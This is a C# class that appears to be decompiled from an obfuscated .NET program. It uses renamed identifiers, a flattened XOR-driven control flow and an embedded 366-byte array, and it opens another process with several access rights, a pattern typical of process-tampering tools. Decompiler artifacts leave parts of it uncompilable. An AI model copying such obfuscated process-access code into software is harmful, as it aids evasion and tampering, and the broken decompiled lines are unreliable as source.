using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public sealed class Class92 : Class84
{
	public struct Struct70
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;
	}

	public struct Struct71
	{
		public IntPtr intptr_0;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 250)]
		public Struct70[] struct70_0;
	}

	internal byte[] byte_0;

	internal IntPtr intptr_1;

	internal IntPtr intptr_2;

	internal IntPtr intptr_3;

	public Class92(GClass2 gclass2_1)
	{
		byte[] array_ = new byte[366];
		smethod_7(array_, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte_0 = array_;
		base._002Ector(gclass2_1);
		method_8(gclass2_1.method_0());
	}

	protected override void method_04C6()
	{
		if (!(method_2() == IntPtr.Zero))
		{
			return;
		}
		while (true)
		{
			int num = -1876519163;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ -151200860)) % 4)
				{
				case 3u:
					method_3(Class171.OpenProcess(Class124.Enum32.flag_2 | Class124.Enum32.flag_3 | Class124.Enum32.flag_4 | Class124.Enum32.flag_5 | Class124.Enum32.flag_9, bool_0: false, method_0()));
					num = (int)((num2 * 772016731) ^ 0x7E68C41);
					continue;
				case 1u:
					num = ((method_0() != -1) ? 1840783373 : 208631226) ^ ((int)num2 * -1554595510);
					continue;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	internal static void smethod_7(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);
	}
}
